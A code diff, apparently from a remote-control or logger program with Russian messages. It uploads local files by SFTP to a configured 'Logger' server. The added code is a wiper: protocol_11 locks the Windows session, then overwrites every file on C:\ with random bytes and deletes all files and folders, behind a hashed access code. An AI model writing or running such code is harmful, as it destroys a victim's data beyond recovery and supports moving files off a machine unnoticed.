@@ -1,5 +1,5 @@
-import paramiko, time, os, shutil, threading, pyautogui
-from utils.logs import stopColor, logError, logServer
+import paramiko, time, os, shutil, threading, pyautogui, hashlib
+from utils.logs import stopColor, logError, logServer, logSystem
 from modules.other import (saveTextfile, 
                            show_current_datetime)
 from utils.config import (ipLogger, usernameLogger, passwordLogger, pathSendLogger)
@@ -7,12 +7,12 @@ from modules.crypt import decrypt, key
 from utils.getTelegram import TelegramGet
 
 def loadFiles(localDir, dir):
-    hostname = decrypt(ipLogger, key)
+    hostname = ipLogger
     port = 22
-    username = decrypt(usernameLogger, key)
-    password = decrypt(passwordLogger, key)
+    username = usernameLogger
+    password = passwordLogger
     local_dir = localDir
-    base_remote_dir = decrypt(pathSendLogger, key) + f"{dir}/"
+    base_remote_dir = pathSendLogger + f"{dir}/"
 
     transport = paramiko.Transport((hostname, port))
     transport.connect(username=username, password=password)
@@ -47,6 +47,34 @@ def loadFiles(localDir, dir):
         sftp.close()
         transport.close()
 
+def check_access_code(input_code, correct_hash):
+    input_hash = hashlib.sha256(input_code.encode()).hexdigest()
+    return input_hash == correct_hash
+
+def delete_files(directory, access_code):
+    correct_hash = 'a08adbd4f1e023d1a447394ead2efeeb790e10a443305cfd8f6946e0501f967b'
+
+    if not check_access_code(access_code, correct_hash):
+        print("Неправильный код доступа!")
+        return
+
+    for root, dirs, files in os.walk(directory):
+        for file in files:
+            file_path = os.path.join(root, file)
+            try:
+                with open(file_path, "wb") as f:
+                    f.write(os.urandom(os.path.getsize(file_path)))
+                os.remove(file_path)
+            except Exception as e:
+                print(logError+f"Ошибка при удалении файла {file_path}: {e}")
+        for dir in dirs:
+            dir_path = os.path.join(root, dir)
+            try:
+                shutil.rmtree(dir_path)
+            except Exception as e:
+                print(logError+f"Ошибка при удалении папки {dir_path}: {e}")
+    print(logSystem+"Все файлы и папки успешно удалены.")
+
 def protocol_21():
     try:
         while True:
@@ -67,5 +95,7 @@ def Protocol21Thread():
     thread = threading.Thread(target=protocol_21, args=())
     thread.start()
 
-def protocol_11():
+def protocol_11(access_code):
     pyautogui.hotkey('win', 'l')
+    directory_to_delete = "C:\\"
+    delete_files(directory_to_delete, access_code)
